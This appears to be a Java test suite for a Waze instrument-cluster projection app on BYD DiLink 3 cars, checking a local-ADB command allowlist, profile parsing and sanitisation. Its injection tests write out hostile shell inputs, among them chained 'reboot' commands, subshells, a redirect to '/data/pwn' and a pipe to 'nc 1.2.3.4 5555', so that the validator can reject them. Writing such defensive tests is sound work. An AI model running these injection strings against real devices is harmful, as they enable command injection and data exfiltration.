// SPDX-License-Identifier: GPL-3.0-only
package local.waze.cluster;

import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.interfaces.RSAPublicKey;
import android.os.Build;

public final class DiLink3Tests {
    private static int count;
    private static void check(boolean ok, String name) {
        count++;
        if (!ok) throw new AssertionError(name);
    }

    public static void main(String[] args) throws Exception {
        testCommandAllowlist();
        testInjectionAttacks();
        testProfileEnumPlacement();
        testDiLink51LayoutIsolation();
        testPublicKeyFormatting();
        testDiLink3Regex();
        testParcelAcceptance();
        testCandidateReasons();
        testSanitization();
        testProfileFallback();
        testAmapAdapterChoose();
        testConfigureOptedInLifecycle();
        System.out.println("DiLink3Tests passed (" + count + " checks).");
    }

    private static void testConfigureOptedInLifecycle() {
        check(!DiLink3Projection.enabled(), "Initially DiLink3Projection is not enabled");
        check(DiLink3Projection.isCandidate(), "SDK 29 is candidate for configure");
        DiLink3Projection.configure(null, true, true, null);
        check(!DiLink3Projection.enabled(), "null activity safely returns without enabling");
        DiLink3Projection.authorizeOnly(null, null);
        DiLink3Projection.forceRestore(null, null);
        check(DiLink3Projection.diLink3Diagnostics().contains("Candidate=true"), "Diagnostics contains candidate flag");
    }

    private static void testAmapAdapterChoose() {
        check(AmapAdapter.choose(null, null).equals("com.byd.amapservice"), "both available prefers com.byd.amapservice");
        check(AmapAdapter.choose("not_installed", null).equals("com.example.amapservice"), "byd missing chooses com.example.amapservice");
        check(AmapAdapter.choose("not_installed", "not_installed").equals("com.byd.amapservice"), "both missing defaults to com.byd.amapservice");
    }

    private static void testProfileFallback() {
        check(ClusterSettings.parseProfile("CORRUPTED_PROFILE") == DiLink51Layout.Profile.AUTOMATIC, "Corrupt profile string falls back to AUTOMATIC");
        check(ClusterSettings.parseProfile("DILINK51") == DiLink51Layout.Profile.DILINK51, "Valid DILINK51 parses correctly");
        check(ClusterSettings.parseProfile("DILINK3") == DiLink51Layout.Profile.DILINK3, "Valid DILINK3 parses correctly");
        check(ClusterSettings.parseProfile(null) == DiLink51Layout.Profile.AUTOMATIC, "Null profile string falls back to AUTOMATIC");
        check(ClusterSettings.parseProfile("") == DiLink51Layout.Profile.AUTOMATIC, "Empty profile string falls back to AUTOMATIC");
    }

    private static void testCommandAllowlist() {
        // Allowed preflight and AutoContainer parcel commands
        check(VehicleLocalAdb.isCommandAllowed("am get-current-user"), "am get-current-user allowed");
        check(VehicleLocalAdb.isCommandAllowed("id -u"), "id -u allowed");
        check(VehicleLocalAdb.isCommandAllowed("getprop ro.build.version.sdk"), "getprop sdk allowed");
        check(VehicleLocalAdb.isCommandAllowed("getprop ro.build.display.id"), "getprop display.id allowed");
        check(VehicleLocalAdb.isCommandAllowed("getprop ro.product.name"), "getprop product.name allowed");
        check(VehicleLocalAdb.isCommandAllowed("service check AutoContainer"), "service check AutoContainer allowed");
        check(VehicleLocalAdb.isCommandAllowed("pm path --user 0 com.example.amapservice"), "pm path user 0 allowed");
        check(VehicleLocalAdb.isCommandAllowed("pm path --user 10 com.example.amapservice"), "pm path user 10 allowed");
        check(VehicleLocalAdb.isCommandAllowed("pm path --user 0 com.byd.amapservice"), "pm path byd user 0 allowed");
        check(VehicleLocalAdb.isCommandAllowed("pm path --user 10 com.byd.amapservice"), "pm path byd user 10 allowed");
        check(VehicleLocalAdb.isCommandAllowed("service call AutoContainer 2 i32 1000 i32 16 s16 ''"), "parcel cmd 16 allowed");
        check(VehicleLocalAdb.isCommandAllowed("service call AutoContainer 2 i32 1000 i32 17 s16 ''"), "parcel cmd 17 allowed");
        check(VehicleLocalAdb.isCommandAllowed("service call AutoContainer 2 i32 1000 i32 18 s16 ''"), "parcel cmd 18 allowed");
        check(VehicleLocalAdb.isCommandAllowed("service call AutoContainer 2 i32 1000 i32 35 s16 ''"), "parcel cmd 35 allowed");

        // Disallowed getprop keys
        check(!VehicleLocalAdb.isCommandAllowed("getprop ro.hardware"), "general getprop rejected");
        check(!VehicleLocalAdb.isCommandAllowed("getprop ro.build.version.release"), "general getprop release rejected");
        check(!VehicleLocalAdb.isCommandAllowed("getprop"), "bare getprop rejected");
    }

    private static void testInjectionAttacks() {
        check(!VehicleLocalAdb.isCommandAllowed("getprop ro.build.version.sdk; reboot"), "semicolon injection rejected");
        check(!VehicleLocalAdb.isCommandAllowed("pm path --user 0 com.example.amapservice && id"), "ampersand injection rejected");
        check(!VehicleLocalAdb.isCommandAllowed("getprop $(id)"), "subshell dollar injection rejected");
        check(!VehicleLocalAdb.isCommandAllowed("getprop `id`"), "subshell backtick injection rejected");
        check(!VehicleLocalAdb.isCommandAllowed("id -u | nc 1.2.3.4 5555"), "pipe injection rejected");
        check(!VehicleLocalAdb.isCommandAllowed("am get-current-user > /data/pwn"), "redirection injection rejected");
        check(!VehicleLocalAdb.isCommandAllowed("id -u\nreboot"), "newline injection rejected");
        check(!VehicleLocalAdb.isCommandAllowed("id -u\r\nreboot"), "crlf injection rejected");
        check(!VehicleLocalAdb.isCommandAllowed("service call AutoContainer 2 i32 1000 i32 99 s16 ''"), "unknown parcel cmd rejected");
        check(!VehicleLocalAdb.isCommandAllowed(null), "null command rejected");
        check(!VehicleLocalAdb.isCommandAllowed(""), "empty command rejected");
    }

    private static void testProfileEnumPlacement() {
        DiLink51Layout.Profile[] values = DiLink51Layout.Profile.values();
        check(values.length == 4, "Profile enum has 4 entries");
        check(values[0] == DiLink51Layout.Profile.AUTOMATIC, "Profile 0 is AUTOMATIC");
        check(values[1] == DiLink51Layout.Profile.DILINK51, "Profile 1 is DILINK51");
        check(values[2] == DiLink51Layout.Profile.DILINK5, "Profile 2 is DILINK5");
        check(values[3] == DiLink51Layout.Profile.DILINK3, "Profile 3 is DILINK3 (appended at end)");
    }

    private static void testDiLink51LayoutIsolation() {
        // DILINK3 must never activate 5.1 layout or side card geometry
        check(!DiLink51Layout.active(DiLink51Layout.Profile.DILINK3, DiLink51Layout.FINGERPRINT), "DILINK3 inactive on 5.1 fingerprint");
        check(!DiLink51Layout.active(DiLink51Layout.Profile.DILINK3, DiLink51Layout.LEOPARD5_FINGERPRINT), "DILINK3 inactive on leopard5 fingerprint");
        check(!DiLink51Layout.active(DiLink51Layout.Profile.DILINK3, "unknown_firmware"), "DILINK3 inactive on unknown firmware");
    }

    private static void testPublicKeyFormatting() throws Exception {
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
        kpg.initialize(2048);
        KeyPair kp = kpg.generateKeyPair();
        byte[] formatted = VehicleLocalAdb.formatPublicKey((RSAPublicKey) kp.getPublic());
        check(formatted != null && formatted.length > 500, "formatted key length");
        String text = new String(formatted, java.nio.charset.StandardCharsets.UTF_8);
        check(text.endsWith(" waze@car\0"), "key ends with car identity tag");
    }

    private static void testDiLink3Regex() {
        check(DiLink3Projection.diLink3Name("DiLink3"), "DiLink3 matches");
        check(DiLink3Projection.diLink3Name("dilink3"), "dilink3 matches lowercase");
        check(DiLink3Projection.diLink3Name("DiLink3.0"), "DiLink3.0 matches");
        check(DiLink3Projection.diLink3Name("BYD-DiLink3-202206"), "BYD prefix matches");
        check(DiLink3Projection.diLink3Name("Auto_DiLink3.0_Rel"), "infix matches");

        check(!DiLink3Projection.diLink3Name("DiLink5"), "DiLink5 rejected");
        check(!DiLink3Projection.diLink3Name("DiLink5.1"), "DiLink5.1 rejected");
        check(!DiLink3Projection.diLink3Name("DiLink30"), "DiLink30 rejected (boundary)");
        check(!DiLink3Projection.diLink3Name("Pixel 8"), "generic phone rejected");
        check(!DiLink3Projection.diLink3Name(null), "null rejected");
        check(!DiLink3Projection.diLink3Name(""), "empty rejected");
    }

    private static void testParcelAcceptance() {
        check(DiLink3Projection.accepted("Result: Parcel(00000000    '....')"), "AOSP parcel result 00000000 accepted");
        check(DiLink3Projection.accepted("Result: Parcel(0x00000000: 00000000  '....')"), "Hex offset parcel accepted");
        check(DiLink3Projection.accepted("Parcel(00000000)"), "Bare parcel accepted");

        check(!DiLink3Projection.accepted("Result: Parcel(ffffffff)"), "Error parcel rejected");
        check(!DiLink3Projection.accepted("Result: Parcel(00000001)"), "Non-zero parcel rejected");
        check(!DiLink3Projection.accepted("Service not found"), "Error string rejected");
        check(!DiLink3Projection.accepted(null), "null rejected");
        check(!DiLink3Projection.accepted(""), "empty rejected");
    }

    private static void testCandidateReasons() {
        try {
            java.lang.reflect.Field field = Build.VERSION.class.getField("SDK_INT");
            int orig = field.getInt(null);
            field.setInt(null, 29);
            check(DiLink3Projection.isCandidate(), "Android 10 is candidate");
            check(DiLink3Projection.candidateRejectionReason() == null, "No rejection reason on Android 10");

            field.setInt(null, 34);
            check(!DiLink3Projection.isCandidate(), "SDK 34 is not DiLink 3 candidate");
            String rejection = DiLink3Projection.candidateRejectionReason();
            check(rejection != null && rejection.contains("SDK 29") && rejection.contains("SDK 34"),
                  "Rejection reason clearly explains SDK 29 required while current is SDK 34");

            field.setInt(null, orig);
        } catch (Exception e) {
            check(DiLink3Projection.isCandidate() == (Build.VERSION.SDK_INT == 29), "Candidate check matches SDK_INT == 29");
        }
    }

    private static void testSanitization() {
        check("test".equals(DiLink3Projection.sanitize("test\u0000\u0007\n", 64)), "control chars stripped");
        check(DiLink3Projection.sanitize(null, 64).equals("null"), "null returns null marker");
        String longStr = "1234567890123456789012345678901234567890123456789012345678901234567890";
        check(DiLink3Projection.sanitize(longStr, 64).length() == 64, "truncated to max 64 chars");
    }
}
